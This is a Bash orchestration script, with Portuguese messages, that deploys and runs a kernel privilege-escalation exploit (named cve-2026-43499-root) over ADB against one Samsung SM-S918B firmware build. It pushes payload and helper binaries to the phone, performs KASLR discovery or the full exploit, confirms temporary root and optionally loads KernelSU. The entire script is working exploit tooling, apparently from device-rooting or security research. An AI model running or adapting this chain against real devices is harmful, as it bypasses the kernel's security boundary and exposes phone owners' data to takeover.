#!/usr/bin/env bash
set -euo pipefail

script_dir="$(cd -- "$(dirname -- "${BASH_SOURCE[0]}")" && pwd)"
# shellcheck source=common.sh
source "$script_dir/common.sh"

usage() {
  cat <<'EOF'
Uso: run-zzhl-device.sh --serial SERIAL (--slide-only | --execute) [opções]

Opções:
  --serial SERIAL     Serial ADB.
  --slide-only        Valida identidade, launcher e descoberta KASLR.
  --execute           Executa o port completo uma única vez.
  --ksud ARQUIVO      Loader KernelSU exato para ZZHL; opcional.
  --output DIR        Diretório de evidência.
  -h, --help          Mostra esta ajuda.
EOF
}

serial=
mode=
ksud=
output=
while [[ $# -gt 0 ]]; do
  case "$1" in
    --serial) serial="${2:?serial ausente}"; shift 2 ;;
    --slide-only) mode=slide; shift ;;
    --execute) mode=execute; shift ;;
    --ksud) ksud="${2:?arquivo ausente}"; shift 2 ;;
    --output) output="${2:?diretório ausente}"; shift 2 ;;
    -h|--help) usage; exit 0 ;;
    *) die "opção desconhecida: $1" ;;
  esac
done

[[ "$mode" == slide || "$mode" == execute ]] || die "escolha --slide-only ou --execute"
need_cmd "${ADB:-adb}"
need_cmd sha256sum
serial="$(resolve_serial "$serial")"
require_device "$serial"

payload="$repo_dir/build/payload.so"
helper="$repo_dir/../helper/build/cve-2026-43499-root"
factory="$repo_dir/build/mm-exec-factory"
launcher="$repo_dir/build/stability-launcher-zzhl"
for artifact in "$payload" "$helper" "$factory" "$launcher"; do
  [[ -x "$artifact" || "$artifact" == "$payload" && -r "$artifact" ]] ||
    die "artefato ausente; compile antes: $artifact"
done
if [[ -n "$ksud" ]]; then
  [[ -r "$ksud" ]] || die "ksud ausente: $ksud"
fi

stamp="$(timestamp_utc)"
output="${output:-$repo_dir/evidence/zzhl-fresh/$stamp-$mode}"
mkdir -p "$output"
"$script_dir/preflight-device.sh" --serial "$serial" \
  --expect-build S918BXXUAZZHL --require-clean --output "$output/preflight.json"

model="$(adb_shell "$serial" getprop ro.product.model | strip_cr)"
device="$(adb_shell "$serial" getprop ro.product.device | strip_cr)"
fingerprint="$(adb_shell "$serial" getprop ro.build.fingerprint | strip_cr)"
kernel="$(adb_shell "$serial" uname -r | strip_cr)"
boot_before="$(adb_shell "$serial" cat /proc/sys/kernel/random/boot_id | strip_cr)"
[[ "$model" == SM-S918B && "$device" == dm3q ]] || die "modelo/device divergente: $model/$device"
[[ "$fingerprint" == samsung/dm3qxxx/dm3q:17/CP2A.260605.016/S918BXXUAZZHL:user/release-keys ]] ||
  die "fingerprint divergente: $fingerprint"
[[ "$kernel" == 5.15.197-android13-8-34343818-abS918BXXUAZZHL ]] ||
  die "kernel divergente: $kernel"

stale="$(adb_shell "$serial" "ps -A | grep -E 'cve43499-(hold|roothold)|stability-launcher-zzhl' || true" | strip_cr)"
[[ -z "$stale" ]] || die "estado anterior ativo; reinicie antes de executar: $stale"
if adb_shell "$serial" test -S /data/local/tmp/temp_su.sock >/dev/null 2>&1; then
  die "socket de root temporário já existe; reinicie antes de executar"
fi

remote=/data/local/tmp/rmg-zzhl-fresh
adb_shell "$serial" "rm -rf '$remote' && mkdir -p '$remote' && rm -f /data/local/tmp/rmg-trace.txt"
"${ADB:-adb}" -s "$serial" push "$payload" "$remote/payload.so" >/dev/null
"${ADB:-adb}" -s "$serial" push "$helper" "$remote/root-helper" >/dev/null
"${ADB:-adb}" -s "$serial" push "$factory" "$remote/mm-exec-factory" >/dev/null
"${ADB:-adb}" -s "$serial" push "$launcher" "$remote/stability-launcher-zzhl" >/dev/null
if [[ -n "$ksud" ]]; then
  "${ADB:-adb}" -s "$serial" push "$ksud" /data/local/tmp/ksud-selected >/dev/null
fi
adb_shell "$serial" "chmod 700 '$remote/root-helper' '$remote/mm-exec-factory' '$remote/stability-launcher-zzhl'"

{
  printf 'boot_id=%s\nmode=%s\n' "$boot_before" "$mode"
  sha256sum "$payload" "$helper" "$factory" "$launcher"
  [[ -z "$ksud" ]] || sha256sum "$ksud"
} > "$output/artifacts.sha256"

verify_remote() {
  local host_path="$1" remote_path="$2" expected actual
  expected="$(sha256sum "$host_path" | awk '{print $1}')"
  actual="$(adb_shell "$serial" "sha256sum '$remote_path'" | strip_cr | awk '{print $1}')"
  [[ "$actual" == "$expected" ]] || die "hash divergente após adb push: $remote_path"
  printf '%s  %s\n' "$actual" "$remote_path"
}
{
  verify_remote "$payload" "$remote/payload.so"
  verify_remote "$helper" "$remote/root-helper"
  verify_remote "$factory" "$remote/mm-exec-factory"
  verify_remote "$launcher" "$remote/stability-launcher-zzhl"
  [[ -z "$ksud" ]] || verify_remote "$ksud" /data/local/tmp/ksud-selected
} > "$output/device-artifacts.sha256"

env_args="RMG_TRACE_FILE=1"
if [[ "$mode" == slide ]]; then
  env_args="$env_args SLIDE_ONLY=1"
fi
set +e
adb_shell "$serial" "env $env_args '$remote/stability-launcher-zzhl' --payload '$remote/payload.so' --helper '$remote/root-helper' --mm-factory '$remote/mm-exec-factory'" \
  > "$output/device.log" 2>&1
adb_rc=$?
set -e
printf '%s\n' "$adb_rc" > "$output/adb-exit-code.txt"

if ! "${ADB:-adb}" -s "$serial" get-state >/dev/null 2>&1; then
  note "ADB desconectou; aguardando o aparelho voltar"
  "${ADB:-adb}" -s "$serial" wait-for-device
fi
boot_after="$(adb_shell "$serial" cat /proc/sys/kernel/random/boot_id | strip_cr)"
printf '%s\n' "$boot_after" > "$output/boot-id-after.txt"
"${ADB:-adb}" -s "$serial" pull /data/local/tmp/rmg-trace.txt "$output/rmg-trace.txt" >/dev/null 2>&1 || true

if [[ "$mode" == slide ]]; then
  if [[ "$adb_rc" == 0 && "$boot_after" == "$boot_before" ]] &&
     grep -q 'stage=kernel-location-ready' "$output/device.log" &&
     grep -q 'exploit completed attempt=1/1' "$output/device.log" &&
     ! grep -q 'stage=kernel-mutation-pending' "$output/device.log"; then
    ok "ZZHL SLIDE_ONLY aprovado; boot=$boot_after evidência=$output"
    exit 0
  fi
  die "SLIDE_ONLY falhou ou reiniciou; não execute novamente neste boot; evidência=$output"
fi

root_proof=
if [[ "$boot_after" == "$boot_before" ]]; then
  for _ in $(seq 1 20); do
    root_proof="$(adb_shell "$serial" "'$remote/root-helper' -c id" 2>&1 | strip_cr || true)"
    [[ "$root_proof" == *'uid=0(root)'* ]] && break
    sleep 1
  done
fi
printf '%s\n' "$root_proof" > "$output/root-proof.txt"

ksu_state=not-requested
if [[ -n "$ksud" && "$root_proof" == *'uid=0(root)'* ]]; then
  set +e
  adb_shell "$serial" "'$remote/root-helper' --late-load" > "$output/kernelsu.log" 2>&1
  ksu_rc=$?
  set -e
  if [[ "$ksu_rc" == 0 ]] && grep -q 'KernelSU control verified' "$output/kernelsu.log"; then
    ksu_state=verified
  else
    ksu_state=failed
  fi
fi
printf '%s\n' "$ksu_state" > "$output/kernelsu-state.txt"

if [[ "$boot_after" == "$boot_before" && "$root_proof" == *'uid=0(root)'* ]] &&
   grep -q 'stage=temporary-root-ready' "$output/device.log"; then
  ok "root temporário ZZHL aprovado; KernelSU=$ksu_state; evidência=$output"
  exit 0
fi
die "execução incompleta; não repita neste boot; evidência=$output"
